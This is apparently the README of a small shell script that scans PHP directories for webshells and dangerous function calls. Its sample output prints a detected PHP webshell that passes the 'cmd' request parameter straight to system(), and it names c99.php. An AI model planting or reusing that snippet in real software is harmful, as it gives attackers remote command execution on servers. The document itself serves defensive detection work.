**Description:**

Simple script for detect possible backdoors in files PHP. (Good for the Wordpress PHP files.)


**Usage:**
```
$ ./findbackdoor

   Invalid option!

   Use: ./findbackdoor.sh <directory scan> <1 or 2> <lines>
   1 = WebShells
   2 = Functions ( <lines> is the number of lines before and after the match (default: 5) )

$ ./findbackdoor /tmp/teste/ 1

[+] Possible webshell found!
/tmp/teste/c99.php

$ ./findbackdoor /tmp/teste/ 2

[+] Possible dangerous function!
[+] Last modification in /tmp/teste/ha.php: 2014-10-15 02:14:38.163231500 -0300

1-<?php
2-if(isset($_REQUEST[‘cmd’])){
3-        echo "<pre>";
4-        $cmd = ($_REQUEST[‘cmd’]);
5:        system($cmd);
6-        echo "</pre>";
7-        die;
8-}
9-?>

$ ./findbackdoor /tmp/teste/ 2 1

[+] Possible dangerous function!
[+] Last modification in /tmp/teste/ha.php: 2014-10-15 02:14:38.163231500 -0300

4-        $cmd = ($_REQUEST[‘cmd’]);
5:        system($cmd);
6-        echo "</pre>";

$
```

**TODO:**

Missing some features, but it's a start.

**Contributing**

1. Fork it
2. Create your feature branch (git checkout -b my-new-feature)
3. Commit your changes (git commit -am 'Add some feature')
4. Push to the branch (git push origin my-new-feature)
5. Create new Pull Request

[]'s

